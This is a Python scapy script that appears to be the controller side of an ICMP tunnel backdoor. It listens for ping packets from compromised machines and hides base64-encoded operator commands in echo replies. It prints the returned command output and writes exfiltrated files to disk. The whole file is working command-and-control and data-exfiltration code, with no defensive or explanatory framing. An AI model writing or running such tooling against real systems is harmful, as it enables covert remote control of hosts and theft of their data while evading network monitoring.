#!/usr/bin/python3

from scapy.all import *
from threading import Thread, Lock, Semaphore
from base64 import *
import time

avail_cmd = Semaphore(0)
avail_print = Semaphore(1)
command=""
msg=""
stop=0

def parse_end(packet):
	if ('END' == b64decode(packet[Raw].load).decode('ascii').split()[-1]):
		return True

	return False
	
def concat_msg(packet):
	global msg
	msg += b64decode(packet[Raw].load).decode('ascii')
	
def send_cmd(packet, command):
	try:
		ping_rep=IP(dst=packet[0][IP].src, id=packet[0][IP].id)/ICMP(type="echo-reply")/(b64encode(command.encode('ascii')))
		send(ping_rep, verbose=False)
	except Exception as e:
		print("in send_cmd: "+e)
	finally:
		return

def parse_msg(msg_lst):
	try:
		if(msg_lst[-2] == 'RUN'):
			print("\n".join(msg_lst[0:-2]))
			
		elif(msg_lst[-2] == 'FILE'):
			with open("outputfile"+str(parse_msg.counter), 'wb+') as f:
				f.write(bytearray.fromhex("".join(msg_lst[0:-2])))
			parse_msg.counter += 1
	except Exception as e:
		print("in parse_msg: "+e)
	
	finally:
		avail_print.release()
		return
	
		
parse_msg.counter=1

def recieve_msg():
	try:
		global stop
		global command
		while not stop:
			global msg
			prailer = "START "
			msg = ""
			rp = sniff(filter="(icmp and icmp[0]=8) or (((ip[6:2] > 0) or (ip[7] > 0)) and (not ip[6] = 64))",prn=concat_msg, stop_filter=parse_end, timeout=100)
			msg_lst = msg.split()
			if('READY' == msg_lst[0] and avail_cmd.acquire(blocking=False)):
				send_cmd(rp, prailer+command)
			elif('READY' != msg_lst[0]):
				parse_msg(msg_lst)
	except Exception as e:
		print("in recieve_msg: "+e)
	finally:
		return

def main():
	try:
		rcv_thrd = Thread(target=recieve_msg)
		rcv_thrd.start()
	except:
		print("cant start listen/response threads")
	
	try:
		global command
		while True:
			avail_print.acquire(timeout=60)
			command = input("Enter command: ")
			if(command == 'stop'):
				global stop
				stop=1
				break
			avail_cmd.release()
				
	
	except Exception as e:
		print("in main: "+e)
	
	finally:
		rcv_thrd.join()
		return 0

if __name__=="__main__":
	main()
